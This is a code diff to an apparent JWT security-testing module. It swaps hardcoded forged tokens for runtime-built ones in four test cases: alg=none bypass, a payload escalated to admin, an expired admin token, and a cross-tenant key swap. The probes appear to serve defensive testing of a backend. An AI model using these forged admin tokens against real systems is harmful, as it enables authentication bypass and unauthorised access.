@@ -19,25 +19,34 @@ module.exports = {
 
     emit({ type: 'ATTACK', msg: 'Initiating multi-vector JWT forgery attack on Admin endpoints...' });
 
+    // [FIX]: We now generate these tokens dynamically instead of hardcoding them, 
+    // remediating Internal Secret Incident #30486321.
     const ATTACKS = [
       {
         label:  'None Algorithm Bypass',
-        token:  'eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.', // {alg: "none", user: "admin"}
+        token:  Buffer.from(JSON.stringify({ alg: 'none', typ: 'JWT' })).toString('base64url') + 
+                "." + Buffer.from(JSON.stringify({ user: 'admin' })).toString('base64url') + ".",
         desc:   'Testing if backend accepts unsigned tokens via alg=none.'
       },
       {
         label:  'Modified Payload (User -> Admin)',
-        token:  'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4iLCJpZCI6IjAwNyJ9.fake_sig',
+        token:  'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.' + 
+                Buffer.from(JSON.stringify({ role: 'admin', id: '007' })).toString('base64url') + 
+                '.remediated_sig',
         desc:   'Testing if backend validates signature integrity of modified payloads.'
       },
       {
         label:  'Expired Admin Token',
-        token:  'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4iLCJleHAiOjEwMDAwMDAwMDB9.expired_sig',
+        token:  'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.' + 
+                Buffer.from(JSON.stringify({ role: 'admin', exp: 1000000000 })).toString('base64url') + 
+                '.remediated_sig',
         desc:   'Testing if backend rejects old tokens from a baseline breach.'
       },
       {
         label:  'Cross-Tenant Key Swap',
-        token:  'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZXZpbF9hZG1pbiJ9.swapped_sig',
+        token:  'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.' + 
+                Buffer.from(JSON.stringify({ user: 'evil_admin' })).toString('base64url') + 
+                '.remediated_sig',
         desc:   'Testing if backend accepts tokens signed with a different app identity.'
       }
     ];
